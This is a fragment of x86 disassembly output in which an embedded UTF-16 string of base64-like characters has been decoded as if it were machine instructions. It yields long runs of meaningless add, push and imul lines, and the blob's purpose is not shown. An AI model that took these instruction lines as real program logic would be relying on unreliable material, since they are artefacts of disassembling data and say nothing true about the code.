  40a1bd:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  40a1c1:	00 6a 00             	add    %ch,0x0(%edx)
  40a1c4:	73 00                	jae    0x40a1c6
  40a1c6:	76 00                	jbe    0x40a1c8
  40a1c8:	57                   	push   %edi
  40a1c9:	00 61 00             	add    %ah,0x0(%ecx)
  40a1cc:	67 00 44 00          	add    %al,0x0(%si)
  40a1d0:	35 00 34 00 74       	xor    $0x74003400,%eax
  40a1d5:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  40a1d9:	00 66 00             	add    %ah,0x0(%esi)
  40a1dc:	52                   	push   %edx
  40a1dd:	00 4d 00             	add    %cl,0x0(%ebp)
  40a1e0:	35 00 65 00 33       	xor    $0x33006500,%eax
  40a1e5:	00 69 00             	add    %ch,0x0(%ecx)
  40a1e8:	56                   	push   %esi
  40a1e9:	00 58 00             	add    %bl,0x0(%eax)
  40a1ec:	45                   	inc    %ebp
  40a1ed:	00 56 00             	add    %dl,0x0(%esi)
  40a1f0:	71 00                	jno    0x40a1f2
  40a1f2:	45                   	inc    %ebp
  40a1f3:	00 49 00             	add    %cl,0x0(%ecx)
  40a1f6:	38 00                	cmp    %al,(%eax)
  40a1f8:	78 00                	js     0x40a1fa
  40a1fa:	51                   	push   %ecx
  40a1fb:	00 67 00             	add    %ah,0x0(%edi)
  40a1fe:	54                   	push   %esp
  40a1ff:	00 2f                	add    %ch,(%edi)
  40a201:	00 51 00             	add    %dl,0x0(%ecx)
  40a204:	6d                   	insl   (%dx),%es:(%edi)
  40a205:	00 66 00             	add    %ah,0x0(%esi)
  40a208:	6f                   	outsl  %ds:(%esi),(%dx)
  40a209:	00 51 00             	add    %dl,0x0(%ecx)
  40a20c:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40a210:	6a 00                	push   $0x0
  40a212:	6d                   	insl   (%dx),%es:(%edi)
  40a213:	00 52 00             	add    %dl,0x0(%edx)
  40a216:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40a21a:	4c                   	dec    %esp
  40a21b:	00 35 00 30 00 63    	add    %dh,0x63003000
  40a221:	00 35 00 75 00 33    	add    %dh,0x33007500
  40a227:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a22a:	6d                   	insl   (%dx),%es:(%edi)
  40a22b:	00 69 00             	add    %ch,0x0(%ecx)
  40a22e:	53                   	push   %ebx
  40a22f:	00 4c 00 47          	add    %cl,0x47(%eax,%eax,1)
  40a233:	00 68 00             	add    %ch,0x0(%eax)
  40a236:	6f                   	outsl  %ds:(%esi),(%dx)
  40a237:	00 59 00             	add    %bl,0x0(%ecx)
  40a23a:	71 00                	jno    0x40a23c
  40a23c:	33 00                	xor    (%eax),%eax
  40a23e:	4e                   	dec    %esi
  40a23f:	00 65 00             	add    %ah,0x0(%ebp)
  40a242:	50                   	push   %eax
  40a243:	00 55 00             	add    %dl,0x0(%ebp)
  40a246:	39 00                	cmp    %eax,(%eax)
  40a248:	65 00 4c 00 2f       	add    %cl,%gs:0x2f(%eax,%eax,1)
  40a24d:	00 75 00             	add    %dh,0x0(%ebp)
  40a250:	49                   	dec    %ecx
  40a251:	00 36                	add    %dh,(%esi)
  40a253:	00 41 00             	add    %al,0x0(%ecx)
  40a256:	45                   	inc    %ebp
  40a257:	00 77 00             	add    %dh,0x0(%edi)
  40a25a:	76 00                	jbe    0x40a25c
  40a25c:	52                   	push   %edx
  40a25d:	00 49 00             	add    %cl,0x0(%ecx)
  40a260:	71 00                	jno    0x40a262
  40a262:	49                   	dec    %ecx
  40a263:	00 72 00             	add    %dh,0x0(%edx)
  40a266:	52                   	push   %edx
  40a267:	00 72 00             	add    %dh,0x0(%edx)
  40a26a:	56                   	push   %esi
  40a26b:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  40a26f:	00 79 00             	add    %bh,0x0(%ecx)
  40a272:	2f                   	das
  40a273:	00 48 00             	add    %cl,0x0(%eax)
  40a276:	59                   	pop    %ecx
  40a277:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  40a27b:	00 2b                	add    %ch,(%ebx)
  40a27d:	00 38                	add    %bh,(%eax)
  40a27f:	00 52 00             	add    %dl,0x0(%edx)
  40a282:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  40a286:	49                   	dec    %ecx
  40a287:	00 4e 00             	add    %cl,0x0(%esi)
  40a28a:	66 00 45 00          	data16 add %al,0x0(%ebp)
  40a28e:	57                   	push   %edi
  40a28f:	00 50 00             	add    %dl,0x0(%eax)
  40a292:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  40a296:	4e                   	dec    %esi
  40a297:	00 6f 00             	add    %ch,0x0(%edi)
  40a29a:	47                   	inc    %edi
  40a29b:	00 74 00 38          	add    %dh,0x38(%eax,%eax,1)
  40a29f:	00 56 00             	add    %dl,0x0(%esi)
  40a2a2:	30 00                	xor    %al,(%eax)
  40a2a4:	62 00                	bound  %eax,(%eax)
  40a2a6:	33 00                	xor    (%eax),%eax
  40a2a8:	46                   	inc    %esi
  40a2a9:	00 68 00             	add    %ch,0x0(%eax)
  40a2ac:	73 00                	jae    0x40a2ae
  40a2ae:	76 00                	jbe    0x40a2b0
  40a2b0:	71 00                	jno    0x40a2b2
  40a2b2:	45                   	inc    %ebp
  40a2b3:	00 2f                	add    %ch,(%edi)
  40a2b5:	00 30                	add    %dh,(%eax)
  40a2b7:	00 75 00             	add    %dh,0x0(%ebp)
  40a2ba:	47                   	inc    %edi
  40a2bb:	00 51 00             	add    %dl,0x0(%ecx)
  40a2be:	32 00                	xor    (%eax),%al
  40a2c0:	79 00                	jns    0x40a2c2
  40a2c2:	72 00                	jb     0x40a2c4
  40a2c4:	79 00                	jns    0x40a2c6
  40a2c6:	51                   	push   %ecx
  40a2c7:	00 75 00             	add    %dh,0x0(%ebp)
  40a2ca:	58                   	pop    %eax
  40a2cb:	00 35 00 6f 00 63    	add    %dh,0x63006f00
  40a2d1:	00 4f 00             	add    %cl,0x0(%edi)
  40a2d4:	4a                   	dec    %edx
  40a2d5:	00 54 00 37          	add    %dl,0x37(%eax,%eax,1)
  40a2d9:	00 43 00             	add    %al,0x0(%ebx)
  40a2dc:	50                   	push   %eax
  40a2dd:	00 6d 00             	add    %ch,0x0(%ebp)
  40a2e0:	41                   	inc    %ecx
  40a2e1:	00 65 00             	add    %ah,0x0(%ebp)
  40a2e4:	72 00                	jb     0x40a2e6
  40a2e6:	4d                   	dec    %ebp
  40a2e7:	00 68 00             	add    %ch,0x0(%eax)
  40a2ea:	57                   	push   %edi
  40a2eb:	00 36                	add    %dh,(%esi)
  40a2ed:	00 68 00             	add    %ch,0x0(%eax)
  40a2f0:	41                   	inc    %ecx
  40a2f1:	00 51 00             	add    %dl,0x0(%ecx)
  40a2f4:	57                   	push   %edi
  40a2f5:	00 45 00             	add    %al,0x0(%ebp)
  40a2f8:	57                   	push   %edi
  40a2f9:	00 30                	add    %dh,(%eax)
  40a2fb:	00 71 00             	add    %dh,0x0(%ecx)
  40a2fe:	54                   	push   %esp
  40a2ff:	00 53 00             	add    %dl,0x0(%ebx)
  40a302:	69 00 57 00 65 00    	imul   $0x650057,(%eax),%eax
  40a308:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
  40a30c:	47                   	inc    %edi
  40a30d:	00 4e 00             	add    %cl,0x0(%esi)
  40a310:	2b 00                	sub    (%eax),%eax
  40a312:	56                   	push   %esi
  40a313:	00 50 00             	add    %dl,0x0(%eax)
  40a316:	78 00                	js     0x40a318
  40a318:	4a                   	dec    %edx
  40a319:	00 7a 00             	add    %bh,0x0(%edx)
  40a31c:	53                   	push   %ebx
  40a31d:	00 45 00             	add    %al,0x0(%ebp)
  40a320:	34 00                	xor    $0x0,%al
  40a322:	6d                   	insl   (%dx),%es:(%edi)
  40a323:	00 63 00             	add    %ah,0x0(%ebx)
  40a326:	4e                   	dec    %esi
  40a327:	00 6d 00             	add    %ch,0x0(%ebp)
  40a32a:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40a32e:	35 00 69 00 68       	xor    $0x68006900,%eax
  40a333:	00 68 00             	add    %ch,0x0(%eax)
  40a336:	37                   	aaa
  40a337:	00 55 00             	add    %dl,0x0(%ebp)
  40a33a:	41                   	inc    %ecx
  40a33b:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40a33f:	00 6a 00             	add    %ch,0x0(%edx)
  40a342:	56                   	push   %esi
  40a343:	00 62 00             	add    %ah,0x0(%edx)
  40a346:	63 00                	arpl   %eax,(%eax)
  40a348:	6a 00                	push   $0x0
  40a34a:	63 00                	arpl   %eax,(%eax)
  40a34c:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  40a350:	62 00                	bound  %eax,(%eax)
  40a352:	78 00                	js     0x40a354
  40a354:	41                   	inc    %ecx
  40a355:	00 4b 00             	add    %cl,0x0(%ebx)
  40a358:	37                   	aaa
  40a359:	00 36                	add    %dh,(%esi)
  40a35b:	00 6d 00             	add    %ch,0x0(%ebp)
  40a35e:	2f                   	das
  40a35f:	00 36                	add    %dh,(%esi)
  40a361:	00 6d 00             	add    %ch,0x0(%ebp)
  40a364:	4d                   	dec    %ebp
  40a365:	00 59 00             	add    %bl,0x0(%ecx)
  40a368:	41                   	inc    %ecx
  40a369:	00 46 00             	add    %al,0x0(%esi)
  40a36c:	59                   	pop    %ecx
  40a36d:	00 63 00             	add    %ah,0x0(%ebx)
  40a370:	44                   	inc    %esp
  40a371:	00 45 00             	add    %al,0x0(%ebp)
  40a374:	76 00                	jbe    0x40a376
  40a376:	74 00                	je     0x40a378
  40a378:	63 00                	arpl   %eax,(%eax)
  40a37a:	4d                   	dec    %ebp
  40a37b:	00 65 00             	add    %ah,0x0(%ebp)
  40a37e:	56                   	push   %esi
  40a37f:	00 51 00             	add    %dl,0x0(%ecx)
  40a382:	45                   	inc    %ebp
  40a383:	00 57 00             	add    %dl,0x0(%edi)
  40a386:	72 00                	jb     0x40a388
  40a388:	68 00 77 00 74       	push   $0x74007700
  40a38d:	00 49 00             	add    %cl,0x0(%ecx)
  40a390:	6e                   	outsb  %ds:(%esi),(%dx)
  40a391:	00 68 00             	add    %ch,0x0(%eax)
  40a394:	44                   	inc    %esp
  40a395:	00 48 00             	add    %cl,0x0(%eax)
  40a398:	6e                   	outsb  %ds:(%esi),(%dx)
  40a399:	00 4c 00 51          	add    %cl,0x51(%eax,%eax,1)
  40a39d:	00 51 00             	add    %dl,0x0(%ecx)
  40a3a0:	4c                   	dec    %esp
  40a3a1:	00 48 00             	add    %cl,0x0(%eax)
  40a3a4:	55                   	push   %ebp
  40a3a5:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
  40a3a9:	00 75 00             	add    %dh,0x0(%ebp)
  40a3ac:	39 00                	cmp    %eax,(%eax)
  40a3ae:	39 00                	cmp    %eax,(%eax)
  40a3b0:	4f                   	dec    %edi
  40a3b1:	00 4a 00             	add    %cl,0x0(%edx)
  40a3b4:	70 00                	jo     0x40a3b6
  40a3b6:	6b 00 69             	imul   $0x69,(%eax),%eax
  40a3b9:	00 75 00             	add    %dh,0x0(%ebp)
  40a3bc:	75 00                	jne    0x40a3be
  40a3be:	43                   	inc    %ebx
  40a3bf:	00 4b 00             	add    %cl,0x0(%ebx)
  40a3c2:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  40a3c6:	6d                   	insl   (%dx),%es:(%edi)
  40a3c7:	00 4a 00             	add    %cl,0x0(%edx)
  40a3ca:	6c                   	insb   (%dx),%es:(%edi)
  40a3cb:	00 6f 00             	add    %ch,0x0(%edi)
  40a3ce:	62 00                	bound  %eax,(%eax)
  40a3d0:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
  40a3d4:	42                   	inc    %edx
  40a3d5:	00 59 00             	add    %bl,0x0(%ecx)
  40a3d8:	43                   	inc    %ebx
  40a3d9:	00 4e 00             	add    %cl,0x0(%esi)
  40a3dc:	4c                   	dec    %esp
  40a3dd:	00 41 00             	add    %al,0x0(%ecx)
  40a3e0:	35 00 6f 00 59       	xor    $0x59006f00,%eax
  40a3e5:	00 41 00             	add    %al,0x0(%ecx)
  40a3e8:	37                   	aaa
  40a3e9:	00 55 00             	add    %dl,0x0(%ebp)
  40a3ec:	5a                   	pop    %edx
  40a3ed:	00 77 00             	add    %dh,0x0(%edi)
  40a3f0:	6c                   	insb   (%dx),%es:(%edi)
  40a3f1:	00 62 00             	add    %ah,0x0(%edx)
  40a3f4:	33 00                	xor    (%eax),%eax
  40a3f6:	63 00                	arpl   %eax,(%eax)
  40a3f8:	36 00 71 00          	add    %dh,%ss:0x0(%ecx)
  40a3fc:	51                   	push   %ecx
  40a3fd:	00 31                	add    %dh,(%ecx)
  40a3ff:	00 4f 00             	add    %cl,0x0(%edi)
  40a402:	57                   	push   %edi
  40a403:	00 4e 00             	add    %cl,0x0(%esi)
  40a406:	45                   	inc    %ebp
  40a407:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
  40a40b:	00 35 00 4e 00 6a    	add    %dh,0x6a004e00
  40a411:	00 68 00             	add    %ch,0x0(%eax)
  40a414:	4b                   	dec    %ebx
  40a415:	00 6a 00             	add    %ch,0x0(%edx)
  40a418:	44                   	inc    %esp
  40a419:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a41c:	55                   	push   %ebp
  40a41d:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40a421:	00 38                	add    %bh,(%eax)
  40a423:	00 35 00 6c 00 70    	add    %dh,0x70006c00
  40a429:	00 31                	add    %dh,(%ecx)
  40a42b:	00 50 00             	add    %dl,0x0(%eax)
  40a42e:	35 00 65 00 76       	xor    $0x76006500,%eax
  40a433:	00 30                	add    %dh,(%eax)
  40a435:	00 4d 00             	add    %cl,0x0(%ebp)
  40a438:	73 00                	jae    0x40a43a
  40a43a:	5a                   	pop    %edx
  40a43b:	00 4c 00 77          	add    %cl,0x77(%eax,%eax,1)
  40a43f:	00 79 00             	add    %bh,0x0(%ecx)
  40a442:	4b                   	dec    %ebx
  40a443:	00 37                	add    %dh,(%edi)
  40a445:	00 77 00             	add    %dh,0x0(%edi)
  40a448:	76 00                	jbe    0x40a44a
  40a44a:	70 00                	jo     0x40a44c
  40a44c:	33 00                	xor    (%eax),%eax
  40a44e:	4d                   	dec    %ebp
  40a44f:	00 62 00             	add    %ah,0x0(%edx)
  40a452:	43                   	inc    %ebx
  40a453:	00 55 00             	add    %dl,0x0(%ebp)
  40a456:	58                   	pop    %eax
  40a457:	00 57 00             	add    %dl,0x0(%edi)
  40a45a:	73 00                	jae    0x40a45c
  40a45c:	6d                   	insl   (%dx),%es:(%edi)
  40a45d:	00 55 00             	add    %dl,0x0(%ebp)
  40a460:	78 00                	js     0x40a462
  40a462:	42                   	inc    %edx
  40a463:	00 67 00             	add    %ah,0x0(%edi)
  40a466:	6c                   	insb   (%dx),%es:(%edi)
  40a467:	00 72 00             	add    %dh,0x0(%edx)
  40a46a:	6a 00                	push   $0x0
  40a46c:	42                   	inc    %edx
  40a46d:	00 45 00             	add    %al,0x0(%ebp)
  40a470:	6d                   	insl   (%dx),%es:(%edi)
  40a471:	00 33                	add    %dh,(%ebx)
  40a473:	00 5a 00             	add    %bl,0x0(%edx)
  40a476:	53                   	push   %ebx
  40a477:	00 33                	add    %dh,(%ebx)
  40a479:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  40a47d:	00 75 00             	add    %dh,0x0(%ebp)
  40a480:	6f                   	outsl  %ds:(%esi),(%dx)
  40a481:	00 68 00             	add    %ch,0x0(%eax)
  40a484:	79 00                	jns    0x40a486
  40a486:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  40a48a:	6d                   	insl   (%dx),%es:(%edi)
  40a48b:	00 76 00             	add    %dh,0x0(%esi)
  40a48e:	72 00                	jb     0x40a490
  40a490:	59                   	pop    %ecx
  40a491:	00 56 00             	add    %dl,0x0(%esi)
  40a494:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  40a498:	45                   	inc    %ebp
  40a499:	00 53 00             	add    %dl,0x0(%ebx)
  40a49c:	44                   	inc    %esp
  40a49d:	00 65 00             	add    %ah,0x0(%ebp)
  40a4a0:	6b 00 79             	imul   $0x79,(%eax),%eax
  40a4a3:	00 73 00             	add    %dh,0x0(%ebx)
  40a4a6:	48                   	dec    %eax
  40a4a7:	00 58 00             	add    %bl,0x0(%eax)
  40a4aa:	68 00 69 00 6f       	push   $0x6f006900
  40a4af:	00 7a 00             	add    %bh,0x0(%edx)
  40a4b2:	79 00                	jns    0x40a4b4
  40a4b4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4b5:	00 73 00             	add    %dh,0x0(%ebx)
  40a4b8:	4b                   	dec    %ebx
  40a4b9:	00 4b 00             	add    %cl,0x0(%ebx)
  40a4bc:	71 00                	jno    0x40a4be
  40a4be:	61                   	popa
  40a4bf:	00 75 00             	add    %dh,0x0(%ebp)
  40a4c2:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40a4c6:	4e                   	dec    %esi
  40a4c7:	00 4e 00             	add    %cl,0x0(%esi)
  40a4ca:	4c                   	dec    %esp
  40a4cb:	00 53 00             	add    %dl,0x0(%ebx)
  40a4ce:	66 00 78 00          	data16 add %bh,0x0(%eax)
  40a4d2:	57                   	push   %edi
  40a4d3:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  40a4d7:	00 4c 00 46          	add    %cl,0x46(%eax,%eax,1)
  40a4db:	00 46 00             	add    %al,0x0(%esi)
  40a4de:	51                   	push   %ecx
  40a4df:	00 51 00             	add    %dl,0x0(%ecx)
  40a4e2:	56                   	push   %esi
  40a4e3:	00 6f 00             	add    %ch,0x0(%edi)
  40a4e6:	58                   	pop    %eax
  40a4e7:	00 5a 00             	add    %bl,0x0(%edx)
  40a4ea:	59                   	pop    %ecx
  40a4eb:	00 59 00             	add    %bl,0x0(%ecx)
  40a4ee:	4c                   	dec    %esp
  40a4ef:	00 78 00             	add    %bh,0x0(%eax)
  40a4f2:	6d                   	insl   (%dx),%es:(%edi)
  40a4f3:	00 4c 00 38          	add    %cl,0x38(%eax,%eax,1)
  40a4f7:	00 78 00             	add    %bh,0x0(%eax)
  40a4fa:	5a                   	pop    %edx
  40a4fb:	00 55 00             	add    %dl,0x0(%ebp)
  40a4fe:	46                   	inc    %esi
  40a4ff:	00 57 00             	add    %dl,0x0(%edi)
  40a502:	32 00                	xor    (%eax),%al
  40a504:	46                   	inc    %esi
  40a505:	00 46 00             	add    %al,0x0(%esi)
  40a508:	32 00                	xor    (%eax),%al
  40a50a:	6b 00 36             	imul   $0x36,(%eax),%eax
  40a50d:	00 6f 00             	add    %ch,0x0(%edi)
  40a510:	31 00                	xor    %eax,(%eax)
  40a512:	75 00                	jne    0x40a514
  40a514:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40a518:	51                   	push   %ecx
  40a519:	00 76 00             	add    %dh,0x0(%esi)
  40a51c:	46                   	inc    %esi
  40a51d:	00 67 00             	add    %ah,0x0(%edi)
  40a520:	4a                   	dec    %edx
  40a521:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
  40a525:	00 52 00             	add    %dl,0x0(%edx)
  40a528:	6f                   	outsl  %ds:(%esi),(%dx)
  40a529:	00 33                	add    %dh,(%ebx)
  40a52b:	00 6e 00             	add    %ch,0x0(%esi)
  40a52e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a52f:	00 4a 00             	add    %cl,0x0(%edx)
  40a532:	36 00 59 00          	add    %bl,%ss:0x0(%ecx)
  40a536:	56                   	push   %esi
  40a537:	00 64 00 41          	add    %ah,0x41(%eax,%eax,1)
  40a53b:	00 78 00             	add    %bh,0x0(%eax)
  40a53e:	5a                   	pop    %edx
  40a53f:	00 67 00             	add    %ah,0x0(%edi)
  40a542:	6a 00                	push   $0x0
  40a544:	6f                   	outsl  %ds:(%esi),(%dx)
  40a545:	00 5a 00             	add    %bl,0x0(%edx)
  40a548:	4f                   	dec    %edi
  40a549:	00 7a 00             	add    %bh,0x0(%edx)
  40a54c:	67 00 30             	add    %dh,(%bx,%si)
  40a54f:	00 6e 00             	add    %ch,0x0(%esi)
  40a552:	4a                   	dec    %edx
  40a553:	00 5a 00             	add    %bl,0x0(%edx)
  40a556:	6d                   	insl   (%dx),%es:(%edi)
  40a557:	00 2b                	add    %ch,(%ebx)
  40a559:	00 55 00             	add    %dl,0x0(%ebp)
  40a55c:	68 00 78 00 36       	push   $0x36007800
  40a561:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  40a565:	00 67 00             	add    %ah,0x0(%edi)
  40a568:	6f                   	outsl  %ds:(%esi),(%dx)
  40a569:	00 32                	add    %dh,(%edx)
  40a56b:	00 56 00             	add    %dl,0x0(%esi)
  40a56e:	56                   	push   %esi
  40a56f:	00 6f 00             	add    %ch,0x0(%edi)
  40a572:	32 00                	xor    (%eax),%al
  40a574:	34 00                	xor    $0x0,%al
  40a576:	4d                   	dec    %ebp
  40a577:	00 7a 00             	add    %bh,0x0(%edx)
  40a57a:	70 00                	jo     0x40a57c
  40a57c:	69 00 69 00 57 00    	imul   $0x570069,(%eax),%eax
  40a582:	6f                   	outsl  %ds:(%esi),(%dx)
  40a583:	00 2b                	add    %ch,(%ebx)
  40a585:	00 59 00             	add    %bl,0x0(%ecx)
  40a588:	52                   	push   %edx
  40a589:	00 47 00             	add    %al,0x0(%edi)
  40a58c:	70 00                	jo     0x40a58e
  40a58e:	68 00 77 00 69       	push   $0x69007700
  40a593:	00 6d 00             	add    %ch,0x0(%ebp)
  40a596:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40a59a:	39 00                	cmp    %eax,(%eax)
  40a59c:	66 00 32             	data16 add %dh,(%edx)
  40a59f:	00 47 00             	add    %al,0x0(%edi)
  40a5a2:	44                   	inc    %esp
  40a5a3:	00 4f 00             	add    %cl,0x0(%edi)
  40a5a6:	34 00                	xor    $0x0,%al
  40a5a8:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  40a5ac:	67 00 35             	add    %dh,(%di)
  40a5af:	00 7a 00             	add    %bh,0x0(%edx)
  40a5b2:	4e                   	dec    %esi
  40a5b3:	00 38                	add    %bh,(%eax)
  40a5b5:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40a5b9:	00 37                	add    %dh,(%edi)
  40a5bb:	00 45 00             	add    %al,0x0(%ebp)
  40a5be:	51                   	push   %ecx
  40a5bf:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  40a5c3:	00 79 00             	add    %bh,0x0(%ecx)
  40a5c6:	42                   	inc    %edx
  40a5c7:	00 47 00             	add    %al,0x0(%edi)
  40a5ca:	34 00                	xor    $0x0,%al
  40a5cc:	64 00 47 00          	add    %al,%fs:0x0(%edi)
  40a5d0:	54                   	push   %esp
  40a5d1:	00 6f 00             	add    %ch,0x0(%edi)
  40a5d4:	79 00                	jns    0x40a5d6
  40a5d6:	4e                   	dec    %esi
  40a5d7:	00 70 00             	add    %dh,0x0(%eax)
  40a5da:	58                   	pop    %eax
  40a5db:	00 78 00             	add    %bh,0x0(%eax)
  40a5de:	4e                   	dec    %esi
  40a5df:	00 61 00             	add    %ah,0x0(%ecx)
  40a5e2:	59                   	pop    %ecx
  40a5e3:	00 38                	add    %bh,(%eax)
  40a5e5:	00 77 00             	add    %dh,0x0(%edi)
  40a5e8:	53                   	push   %ebx
  40a5e9:	00 58 00             	add    %bl,0x0(%eax)
  40a5ec:	7a 00                	jp     0x40a5ee
  40a5ee:	76 00                	jbe    0x40a5f0
  40a5f0:	4b                   	dec    %ebx
  40a5f1:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  40a5f5:	00 57 00             	add    %dl,0x0(%edi)
  40a5f8:	67 00 75 00          	add    %dh,0x0(%di)
  40a5fc:	53                   	push   %ebx
  40a5fd:	00 4b 00             	add    %cl,0x0(%ebx)
  40a600:	4a                   	dec    %edx
  40a601:	00 61 00             	add    %ah,0x0(%ecx)
  40a604:	38 00                	cmp    %al,(%eax)
  40a606:	76 00                	jbe    0x40a608
  40a608:	57                   	push   %edi
  40a609:	00 68 00             	add    %ch,0x0(%eax)
  40a60c:	47                   	inc    %edi
  40a60d:	00 2b                	add    %ch,(%ebx)
  40a60f:	00 65 00             	add    %ah,0x0(%ebp)
  40a612:	75 00                	jne    0x40a614
  40a614:	5a                   	pop    %edx
  40a615:	00 6e 00             	add    %ch,0x0(%esi)
  40a618:	67 00 4b 00          	add    %cl,0x0(%bp,%di)
  40a61c:	53                   	push   %ebx
  40a61d:	00 42 00             	add    %al,0x0(%edx)
  40a620:	66 00 35 00 4a 00 79 	data16 add %dh,0x79004a00
  40a627:	00 37                	add    %dh,(%edi)
  40a629:	00 6f 00             	add    %ch,0x0(%edi)
  40a62c:	55                   	push   %ebp
  40a62d:	00 58 00             	add    %bl,0x0(%eax)
  40a630:	6b 00 75             	imul   $0x75,(%eax),%eax
  40a633:	00 4c 00 62          	add    %cl,0x62(%eax,%eax,1)
  40a637:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  40a63b:	00 73 00             	add    %dh,0x0(%ebx)
  40a63e:	70 00                	jo     0x40a640
  40a640:	79 00                	jns    0x40a642
  40a642:	4a                   	dec    %edx
  40a643:	00 43 00             	add    %al,0x0(%ebx)
  40a646:	50                   	push   %eax
  40a647:	00 61 00             	add    %ah,0x0(%ecx)
  40a64a:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40a64d:	00 6e 00             	add    %ch,0x0(%esi)
  40a650:	69 00 62 00 45 00    	imul   $0x450062,(%eax),%eax
  40a656:	74 00                	je     0x40a658
  40a658:	72 00                	jb     0x40a65a
  40a65a:	57                   	push   %edi
  40a65b:	00 75 00             	add    %dh,0x0(%ebp)
  40a65e:	6a 00                	push   $0x0
  40a660:	59                   	pop    %ecx
  40a661:	00 4a 00             	add    %cl,0x0(%edx)
  40a664:	36 00 54 00 44       	add    %dl,%ss:0x44(%eax,%eax,1)
  40a669:	00 35 00 77 00 39    	add    %dh,0x39007700
  40a66f:	00 45 00             	add    %al,0x0(%ebp)
  40a672:	6b 00 49             	imul   $0x49,(%eax),%eax
  40a675:	00 68 00             	add    %ch,0x0(%eax)
  40a678:	79 00                	jns    0x40a67a
  40a67a:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40a67e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a67f:	00 59 00             	add    %bl,0x0(%ecx)
  40a682:	41                   	inc    %ecx
  40a683:	00 42 00             	add    %al,0x0(%edx)
  40a686:	31 00                	xor    %eax,(%eax)
  40a688:	61                   	popa
  40a689:	00 73 00             	add    %dh,0x0(%ebx)
  40a68c:	69 00 51 00 56 00    	imul   $0x560051,(%eax),%eax
  40a692:	46                   	inc    %esi
  40a693:	00 75 00             	add    %dh,0x0(%ebp)
  40a696:	49                   	dec    %ecx
  40a697:	00 4b 00             	add    %cl,0x0(%ebx)
  40a69a:	33 00                	xor    (%eax),%eax
  40a69c:	6d                   	insl   (%dx),%es:(%edi)
  40a69d:	00 6f 00             	add    %ch,0x0(%edi)
  40a6a0:	34 00                	xor    $0x0,%al
  40a6a2:	31 00                	xor    %eax,(%eax)
  40a6a4:	76 00                	jbe    0x40a6a6
  40a6a6:	4e                   	dec    %esi
  40a6a7:	00 50 00             	add    %dl,0x0(%eax)
  40a6aa:	66 00 2b             	data16 add %ch,(%ebx)
  40a6ad:	00 31                	add    %dh,(%ecx)
  40a6af:	00 4b 00             	add    %cl,0x0(%ebx)
  40a6b2:	4c                   	dec    %esp
  40a6b3:	00 41 00             	add    %al,0x0(%ecx)
  40a6b6:	2f                   	das
  40a6b7:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  40a6bb:	00 65 00             	add    %ah,0x0(%ebp)
  40a6be:	4f                   	dec    %edi
  40a6bf:	00 45 00             	add    %al,0x0(%ebp)
  40a6c2:	45                   	inc    %ebp
  40a6c3:	00 45 00             	add    %al,0x0(%ebp)
  40a6c6:	33 00                	xor    (%eax),%eax
  40a6c8:	42                   	inc    %edx
  40a6c9:	00 5a 00             	add    %bl,0x0(%edx)
  40a6cc:	39 00                	cmp    %eax,(%eax)
  40a6ce:	70 00                	jo     0x40a6d0
  40a6d0:	37                   	aaa
  40a6d1:	00 46 00             	add    %al,0x0(%esi)
  40a6d4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6d5:	00 39                	add    %bh,(%ecx)
  40a6d7:	00 58 00             	add    %bl,0x0(%eax)
  40a6da:	68 00 58 00 34       	push   $0x34005800
  40a6df:	00 2f                	add    %ch,(%edi)
  40a6e1:	00 67 00             	add    %ah,0x0(%edi)
  40a6e4:	2b 00                	sub    (%eax),%eax
  40a6e6:	30 00                	xor    %al,(%eax)
  40a6e8:	74 00                	je     0x40a6ea
  40a6ea:	73 00                	jae    0x40a6ec
  40a6ec:	30 00                	xor    %al,(%eax)
  40a6ee:	48                   	dec    %eax
  40a6ef:	00 55 00             	add    %dl,0x0(%ebp)
  40a6f2:	73 00                	jae    0x40a6f4
  40a6f4:	35 00 75 00 54       	xor    $0x54007500,%eax
  40a6f9:	00 57 00             	add    %dl,0x0(%edi)
  40a6fc:	50                   	push   %eax
  40a6fd:	00 72 00             	add    %dh,0x0(%edx)
  40a700:	4f                   	dec    %edi
  40a701:	00 53 00             	add    %dl,0x0(%ebx)
  40a704:	38 00                	cmp    %al,(%eax)
  40a706:	7a 00                	jp     0x40a708
  40a708:	53                   	push   %ebx
  40a709:	00 67 00             	add    %ah,0x0(%edi)
  40a70c:	76 00                	jbe    0x40a70e
  40a70e:	71 00                	jno    0x40a710
  40a710:	5a                   	pop    %edx
